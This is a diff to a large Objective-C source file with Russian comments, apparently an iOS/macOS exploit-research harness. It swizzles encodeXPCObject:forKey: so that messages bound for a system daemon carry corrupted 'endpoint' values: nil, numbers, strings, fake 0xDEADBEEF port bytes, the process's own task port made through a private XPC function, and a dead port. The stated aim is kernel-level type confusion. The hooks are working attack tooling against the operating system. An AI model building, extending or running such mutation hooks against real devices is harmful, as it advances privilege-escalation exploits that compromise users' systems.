@@ -42261,7 +42261,87 @@ static void p_bq78(void) {
 static IMP bq79_orig_encObj = NULL;
 static IMP bq79_orig_encInt = NULL;
 static IMP bq79_orig_encBool = NULL;
+static IMP bq79_orig_encXPC = NULL;
 static volatile int bq79_mut = -1;
+
+// v234: encodeXPCObject:forKey: — MACH-ПОРТЫ, endpoints, XPC-объекты.
+// Самая критичная поверхность: если демон трактует не-порт как порт
+// → kernel-level type confusion.
+static void bq79_hook_encXPC(id self, SEL _cmd, id xpcObj, NSString *key) {
+    int m = bq79_mut;
+    if (m >= 20 && key) {
+        const char *k = key.UTF8String;
+        switch (m) {
+            case 20: // endpoint → nil
+                if (strcmp(k, "endpoint") == 0) {
+                    LOG("[bq79] m=20: endpoint=nil");
+                    xpcObj = nil;
+                }
+                break;
+            case 21: // endpoint → int (type confusion)
+                if (strcmp(k, "endpoint") == 0) {
+                    xpcObj = @(999999);
+                    LOG("[bq79] m=21: endpoint=NSNumber");
+                }
+                break;
+            case 22: // endpoint → string
+                if (strcmp(k, "endpoint") == 0) {
+                    xpcObj = @"NOT_A_PORT";
+                    LOG("[bq79] m=22: endpoint=NSString");
+                }
+                break;
+            case 23: // endpoint → raw data (фальшивый порт-хендл)
+                if (strcmp(k, "endpoint") == 0) {
+                    static const unsigned char fakePort[8] =
+                        {0xDE,0xAD,0xBE,0xEF,0x00,0x00,0x00,0x01};
+                    xpcObj = [NSData dataWithBytes:fakePort length:8];
+                    LOG("[bq79] m=23: endpoint=fake-NSData");
+                }
+                break;
+            case 24: // endpoint → чужой mach_port (наш task_self!)
+                if (strcmp(k, "endpoint") == 0) {
+                    // private API: resolve через dlsym
+                    static xpc_object_t (*mkMach)(mach_port_t) = NULL;
+                    if (!mkMach) mkMach = (void *)dlsym(
+                        RTLD_DEFAULT, "xpc_mach_send_create");
+                    if (mkMach) {
+                        mach_port_t port = mach_task_self();
+                        xpc_object_t mp = mkMach(port);
+                        if (mp) {
+                            xpcObj = mp;
+                            LOG("[bq79] m=24: endpoint=task_self "
+                                "port=%d", (int)port);
+                        }
+                    } else {
+                        LOG("[bq79] m=24: xpc_mach_send_create "
+                            "недоступен");
+                    }
+                }
+                break;
+            case 25: // endpoint → MACH_PORT_DEAD
+                if (strcmp(k, "endpoint") == 0) {
+                    static xpc_object_t (*mkMach2)(mach_port_t) = NULL;
+                    if (!mkMach2) mkMach2 = (void *)dlsym(
+                        RTLD_DEFAULT, "xpc_mach_send_create");
+                    if (mkMach2) {
+                        xpc_object_t mp = mkMach2(MACH_PORT_DEAD);
+                        if (mp) {
+                            xpcObj = mp;
+                            LOG("[bq79] m=25: endpoint=DEAD port");
+                        }
+                    }
+                }
+                break;
+            case 26: // все XPC-ключи → сериализация? (дамп)
+                LOG("[bq79] m=26: encXPC key=%s type=%s", k,
+                    xpcObj ? NSStringFromClass([xpcObj class]).UTF8String
+                           : "(nil)");
+                break;
+        }
+    }
+    ((void (*)(id, SEL, id, NSString *))bq79_orig_encXPC)(
+        self, _cmd, xpcObj, key);
+}
 
 // v233: encodeInt64:forKey: — reason/flags/value НАСТОЯЩИЕ int-мутации
 static void bq79_hook_encInt(id self, SEL _cmd, long long v, NSString *key) {
@@ -42514,6 +42594,17 @@ static void p_bq79(void) {
                 (IMP)bq79_hook_encBool);
             LOG("[bq79] hook encodeBool: orig=%p", bq79_orig_encBool);
         }
+        // v234: XPC-хук (mach-порты!)
+        Method mx = class_getInstanceMethod(cdrCls,
+            @selector(encodeXPCObject:forKey:));
+        if (mx) {
+            bq79_orig_encXPC = method_setImplementation(mx,
+                (IMP)bq79_hook_encXPC);
+            LOG("[bq79] hook encodeXPCObject: orig=%p",
+                bq79_orig_encXPC);
+        } else {
+            LOG("[bq79] encodeXPCObject:forKey: не найден");
+        }
     }
     fsync(fileno(stderr));
 
@@ -42523,7 +42614,7 @@ static void p_bq79(void) {
     Class laCls = NSClassFromString(@"RBSLegacyAttribute");
     if (!tCls || !aCls || !laCls) { LOG("[bq79] нет классов"); return; }
 
-    static const int NM = 20;
+    static const int NM = 27;
     static const char *names[] = {
         "M0-КОНТРОЛЬ", "M1-expl-binary", "M2-expl-8KB",
         "M3-target=nil", "M4-target=NSNull", "M5-attrs=NSString",
@@ -42532,7 +42623,11 @@ static void p_bq79(void) {
         "M12-procId=NSNumber", "M13-pid=INT_MAX",
         "M14-reason=INT_MIN", "M15-flags=INT64_MAX",
         "M16-reason=0x7FFF00000000", "M17-pid=-1",
-        "M18-requestedReason=0", "M19-bool-override"
+        "M18-requestedReason=0", "M19-bool-override",
+        "M20-endpoint=nil", "M21-endpoint=NSNumber",
+        "M22-endpoint=NSString", "M23-endpoint=fakeData",
+        "M24-endpoint=taskSelf", "M25-endpoint=DEAD",
+        "M26-endpoint-dump"
     };
     int stat[3] = {0, 0, 0};
     for (int mi = 0; mi < NM; mi++) {
